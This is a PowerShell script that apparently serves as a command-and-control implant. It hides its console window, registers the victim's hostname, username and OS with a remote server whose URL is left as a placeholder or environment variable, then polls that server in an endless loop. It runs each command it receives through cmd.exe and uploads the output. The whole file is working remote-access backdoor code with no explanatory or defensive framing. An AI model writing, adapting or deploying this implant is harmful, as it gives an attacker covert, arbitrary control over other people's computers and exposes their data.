$C2Url=if($env:C2_URL){$env:C2_URL}else{"__C2URL__"}
$Int=5;$AID=-join((48..57)+(97..102)|Get-Random -Count 8|%{[char]$_})
try{Add-Type -Name WH -Namespace W -MemberDefinition '[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);' -EA SilentlyContinue;[W.WH]::ShowWindow([W.WH]::GetConsoleWindow(),0)|Out-Null}catch{}
function G($p){try{$w=New-Object System.Net.WebClient;$w.Headers.Add("User-Agent","Mozilla/5.0");return $w.DownloadString("$C2Url$p").Trim()}catch{return ""}}
function P($p,$b){try{$w=New-Object System.Net.WebClient;$w.Headers.Add("User-Agent","Mozilla/5.0");$w.Headers.Add("Content-Type","text/plain");$w.UploadString("$C2Url$p",[string]$b)|Out-Null}catch{}}
function R($c){try{$o=& cmd.exe /c $c 2>&1|Out-String;if($o.Trim()){return $o}else{return "(no output)"}}catch{return "(err:$_)"}}
function Reg{$os=[Uri]::EscapeDataString([Environment]::OSVersion.VersionString);$h=[Uri]::EscapeDataString($env:COMPUTERNAME);$u=[Uri]::EscapeDataString($env:USERNAME);return G "/agent/register?id=$AID&os=$os&hostname=$h&user=$u&type=ps1"}
for($i=0;$i-lt 60;$i++){if((Reg)-like"*OK*"){break};Start-Sleep 5}
while($true){
  try{$cmd=G "/agent/poll?id=$AID"
    switch -Regex($cmd){"^$|^PING$"{};"^REGISTER$"{Reg};"^EXIT$"{exit 0};default{P "/agent/result?id=$AID&cmd=$([Uri]::EscapeDataString($cmd))"(R $cmd)}}
  }catch{}
  Start-Sleep $Int}
